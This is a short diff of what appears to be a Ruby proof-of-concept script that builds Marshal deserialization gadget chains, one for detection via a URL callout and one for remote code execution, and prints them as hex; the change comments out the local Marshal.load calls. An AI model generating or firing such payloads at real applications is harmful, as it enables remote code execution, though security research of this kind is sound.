@@ -108,10 +108,10 @@ end
 url =  "rubygems.org/quick/Marshal.4.8/bundler-2.2.27.gemspec.rz" # replace with URL to call in the detection gadget, for example: test.example.org/path, url should not have a query (?) component.
 detection_gadget_chain = create_detection_gadget_chain(url)
 
-begin
-  Marshal.load(detection_gadget_chain)
-  rescue
-end
+# begin
+  # Marshal.load(detection_gadget_chain)
+  # rescue
+# end
 
 puts detection_gadget_chain.unpack("H*")
 
@@ -121,4 +121,4 @@ rce_gadget_chain = create_rce_gadget_chain(zip_param_to_execute)
 
 puts rce_gadget_chain.unpack("H*")
 
-Marshal.load(rce_gadget_chain)
+# Marshal.load(rce_gadget_chain)
